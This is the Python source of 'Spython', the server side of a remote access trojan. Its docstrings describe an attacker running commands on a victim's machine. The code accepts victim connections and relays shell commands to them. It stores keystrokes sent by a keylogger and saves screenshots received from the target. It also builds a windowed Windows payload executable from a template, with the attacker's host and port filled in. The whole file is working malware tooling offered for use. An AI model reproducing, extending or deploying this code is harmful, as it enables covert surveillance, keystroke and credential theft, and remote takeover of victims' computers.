import socket
import ipaddress
import sys
import os
import threading
import argparse
import subprocess
import shutil

from time import sleep
from termcolor import colored


class Server:
    """This class implements the server logic
    """
    __FLAG = False
    def __init__(self,ip:str,port:int):
         self.ip = ip  
         self.port = port

          	  
    def active_connection(self,verbose:bool = False)->None:
          """This method creates an actual socket(main/active connection) and listens for inbound connections, once the
             connection is established, the attacker can run commands on the victim's machine
             
             :verbose: If true, the socket address(HOST:PORT) is printed to screen , by default it is set to true only the first time the function is called
             :return: None
          """
          if verbose:
             print(f"[*]Listening on {self.ip}:{self.port}")
          prompt = ">".rstrip("\n")
          with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
               sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
               sock.bind((self.ip,self.port))
               sock.listen(2)
               tgt_sock, addr = sock.accept()
               print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
               tgt_sock.settimeout(3)
               while True:
                  try:
                     cmd = input(prompt)
                     if cmd == "tcp_reverse":
                        prompt = "windows_shell>"
                     elif cmd =="exit":
                        prompt = ">"
                     cmd += "\n"
                     tgt_sock.send(cmd.encode())
                     data = tgt_sock.recv(1024).decode()  	   
                     print(data)
                  except KeyboardInterrupt:
                           sys.stderr.write("[-]Active connection terminated")
                           exit()  
                  except EOFError:
                         exit()
                  except TimeoutError:
                      continue
                  #Linux only
                  except socket.timeout:
                      continue
                  except ConnectionAbortedError:
                           print("[-]Connection aborted by target machine")
                           break
                  except BrokenPipeError:
                         print("User entered \"break\" command, connection closed.\nIf you did not enter the break command then an unknown error has occured")
                         break
                  except ConnectionResetError:
                         print("[-] Victim terminated connection")
                         break
                  
          threading.Thread(target=self.active_connection,kwargs={"verbose":self.__FLAG}).start()
    
    def keylog_connection(self,path:str,verbose:bool =False)->None:
        """This method implements the logic of the keylogger server. The data received is appended to a file and each time 
              the connection is closed, the exception is handled and we listen again for new connection                    
          
          :path: Path of file where keystrokes should be  stored. The file path may be relative or absolute and the file may or may not exist. Moreover, it defaults "logs.txt" in currerent directory
          :verbose: If true, the socket address(HOST:PORT) is printed to screen , by default it is set to true only the first time the function is called
          :return: None
        """
        
        if verbose:
           print(f"[*]Listening on {self.ip}:{self.port}")
           print(f"[*]Keystrokes file path -> {colored(path,'green')}")
           
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
             ksock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             ksock.bind((self.ip,self.port))
             ksock.listen(2)
             tgt_ksock, addr = ksock.accept()
             print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
             
             while True:
                  try:
                       keystrokes = tgt_ksock.recv(1024).decode()
                       if not keystrokes:
                          break
                       
                       with open(path, "a") as f:
                              f.write(keystrokes)
                  except ConnectionResetError:
                       print("[-] Victim terminated connection")
                       break
        
        threading.Thread(target=self.keylog_connection,args=(path,),kwargs={"verbose":self.__FLAG}).start()
       
    def screenshot_connection(self,path:str,verbose:bool = False)->None:
        """This method sets up the server with is listens for inbound connection and saves the binary data received into "path". Note that only binary data of image should be sent to this socket

           :path: Path of file where the image(from target machine) should be  stored. The file path may be relative or absolute and the file may or may not exist. Moreover, it defaults "image.jpeg" in currerent directory
           :verbose: If true, the socket address(HOST:PORT) is printed to screen , by default it is set to true only the first time the function is called
           :return: None
        """
        if verbose:
           print(f"[*]Listening on {self.ip}:{self.port}")
           print(f"[*]Image file path -> {colored(path,'green')}")
        
        while True:
           with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
                 s_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 s_sock.bind((self.ip,self.port))
                 s_sock.listen(2)
                 tgt_s_sock, addr = s_sock.accept()
                 print(f"\n[*]Got a connection from {addr[0]}:{addr[1]}")
                 img = tgt_s_sock.recv(2**16)
                 if img:
                    with open(path,"wb") as fp:
                         fp.write(img)
       
    
    def set_flag(self)->None:
      """Setter method that sets private variable _FLAG to True

         :return: None
      """
      self.__FLAG = True

           

def main()->None:
   #Private variables that shoud not be changed
    __TEMPLATE_PATH = "../templates/spython_tcp_template.py"
    __PAYLOAD_FILE_NAME =  "payload.py"
    __SIG_HOST = "SPYTHON_HOST"
    __SIG_PORT = "SPYTHON_PORT"

    FLAG = True

    if args.verbose:
       FLAG =False
    
    #Takes input from user and validates it
    while True:
        HOST = input("Host : ") or "127.0.0.1"
        try:
             IP=ipaddress.IPv4Address(HOST)
        except ipaddress.AddressValueError:
             sys.stderr.write("Invalid IPv4 address\n")
             continue
        try:
            MAIN_PORT = input("Main port:") or 5000
            if int(MAIN_PORT >1000) and int(MAIN_PORT) < (2**16)-3:
               KLOG_PORT = MAIN_PORT+1
               BIN_PORT = MAIN_PORT+2  
      
        except ValueError :
            sys.stderr.write(f"Port number must be of base 10 and between 1000 and {2**16}\n")
        flag = input("Automatically generate paylaod?[y/n](default=y): ") or "y"
        
        #If true, generate source code + compiled version of payload. 
        if flag.lower() == "y":
           TEMP = ""
           with open(__TEMPLATE_PATH,"r") as f:
                data = f.readlines()
                data = [i.replace(__SIG_HOST,f"\"{HOST}\"") for i in data]
                with open(__PAYLOAD_FILE_NAME,"w") as f2:
                     for line in data:
                         f2.write(line)
                with open(__PAYLOAD_FILE_NAME, "r") as f2:
                     new_data = f2.readlines()
                     new_data = [ i.replace(__SIG_PORT,str(MAIN_PORT)) for i in new_data]
                     TEMP = new_data
                with open(__PAYLOAD_FILE_NAME,"w") as f2:
                     for i in TEMP:
                         f2.write(i)
                     TEMP=""
           #improve code below, written for testing purposes
           print("[*]Generating payload...(This may take some time)")
           subprocess.run(f"pyinstaller --onefile --windowed  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
           sleep(1)
           if os.path.isdir("./build"): 
              shutil.rmtree("./build")
           if os.path.exists("payload.spec"):
              os.remove("payload.spec")
           print("[*]Payload generated !")
           os.rename("./dist/payload.exe","../executables/payload.exe")
           os.rmdir("./dist")
           
                            
           break
        elif flag.lower() == "n":
             break
        #asks user for all input again if input is incorrect
        else:
             continue
           
    #Path of file to store retrieved data from victim
    KPATH = input("Path of file to save keystrokes: ") or "logs.txt"
    IPATH = input("Path of file to save image: ") or "image.jpeg"
    
    #Prints user input to screen for validation
    print(f"[*]Host -> {HOST}")
    print("[*]Main port -> {}".format(colored(MAIN_PORT,"green")))
    print("[*]Keylogger server port(K_PORT or KPORT or KEY PORT) -> {}".format(colored(KLOG_PORT,"green")))
    print("[*]Image server port -> {}\n".format(colored(BIN_PORT,"green")))
    
    #Create Server objects, see above
    active_server = Server(HOST,MAIN_PORT)
    keylog_server = Server(HOST,KLOG_PORT)
    img_server = Server(HOST,BIN_PORT)
    
    server_obj = [active_server,keylog_server,img_server]
    
    #Sets flags to true if -v options is specified
    if args.verbose:
       for obj in server_obj:
           obj.set_flag()
       
    
    #Create and start threads
    thread1= threading.Thread(target=active_server.active_connection,kwargs={"verbose":True})
    thread2 = threading.Thread(target=keylog_server.keylog_connection,args=(KPATH,),kwargs={"verbose":True})
    thread3 = threading.Thread(target=img_server.screenshot_connection,args=(IPATH,),kwargs={"verbose":True})
    thread1.start()
    thread2.start()
    thread3.start()
    
    thread1.join()
    thread2.join()
    thread3.join()
    print("[-]Program ended")

if __name__ == "__main__":
   #Parse command line arguments
   parse = argparse.ArgumentParser(usage=f"{os.path.basename(sys.argv[0]) } [options]",description="Command line interface for Spython",formatter_class=argparse.RawDescriptionHelpFormatter,
                                   epilog=f"""Example:\n\t{os.path.basename(sys.argv[0]) } -v""")
   parse.add_argument("-v",required=False,action="store_true",dest="verbose",help="If specified, verbose is set to true and each time a connection is established, it is displayed to the screeen.")
   args = parse.parse_args()
   
   #CLI
   logo = r"""
   _____  _____ __     __  _______  _    _   ____   _   _ 
  / ____||  __ \\ \   / / |__   __|| |  | | / __ \ | \ | |
 | (___  | |__) |\ \_//     | |   | |__| || |  | ||  \| |
  \___ \ |  ___/  \   /      | |   |  __  || |  | || . ` |
  ____) || |       | |       | |   | |  | || |__| || |\  |
 |_____/ |_|       |_|       |_|   |_|  |_| \____/ |_| \_|
                                                          
                                                          
"""
   msg = "This is the command line interface of spython. Fill in the parametes below to start the sever!"
   
   #Checks user OS to initialise CLI
   if os.name == "posix":
      print(logo[:141],colored(logo[141:],"red"))
      print(colored(msg,"red"))
   elif os.name == "nt":
          import colorama
          colorama.init()

          print(logo[:141],colored(logo[141:],"red"))
          print(colored(msg,"red"))

   main()